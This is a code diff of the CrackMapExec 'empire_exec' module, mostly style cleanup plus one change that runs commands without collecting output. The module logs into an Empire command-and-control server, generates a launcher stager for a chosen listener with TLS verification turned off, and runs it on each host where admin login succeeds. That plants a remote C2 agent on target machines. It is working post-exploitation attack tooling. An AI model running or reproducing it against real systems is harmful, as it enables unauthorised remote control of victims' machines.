@@ -2,9 +2,10 @@ import sys
 import requests
 from requests import ConnectionError
 
-#The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
+# The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
 
 class CMEModule:
     '''
@@ -12,9 +13,8 @@ class CMEModule:
         Module by @byt3bl33d3r
     '''
 
-    name='empire_exec'
+    name = "empire_exec"
     description = "Uses Empire's RESTful API to generate a launcher for the specified listener and executes it"
-    supported_protocols = ['smb', 'mssql']
     opsec_safe = True
     multiple_hosts = True
 
@@ -23,18 +23,18 @@ class CMEModule:
             LISTENER    Listener name to generate the launcher for
         '''
 
-        if not 'LISTENER' in module_options:
+        if 'LISTENER' not in module_options:
             context.log.error('LISTENER option is required!')
             sys.exit(1)
 
         self.empire_launcher = None
 
         headers = {'Content-Type': 'application/json'}
-        #Pull the host and port from the config file
+        # Pull the host and port from the config file
         base_url = 'https://{}:{}'.format(context.conf.get('Empire', 'api_host'), context.conf.get('Empire', 'api_port'))
 
         try:
-            #Pull the username and password from the config file
+            # Pull the username and password from the config file
             payload = {'username': context.conf.get('Empire', 'username'),
                        'password': context.conf.get('Empire', 'password')}
 
@@ -47,7 +47,7 @@ class CMEModule:
 
             payload = {'StagerName': 'multi/launcher', 'Listener': module_options['LISTENER']}
             r = requests.post(base_url + '/api/stagers?token={}'.format(token), json=payload, headers=headers, verify=False)
-            
+
             response = r.json()
             if "error" in response:
                 context.log.error("Error from empire : {}".format(response["error"]))
@@ -63,5 +63,5 @@ class CMEModule:
 
     def on_admin_login(self, context, connection):
         if self.empire_launcher:
-            connection.execute(self.empire_launcher)
+            connection.execute(self.empire_launcher, get_output=False)
             context.log.success('Executed Empire Launcher')
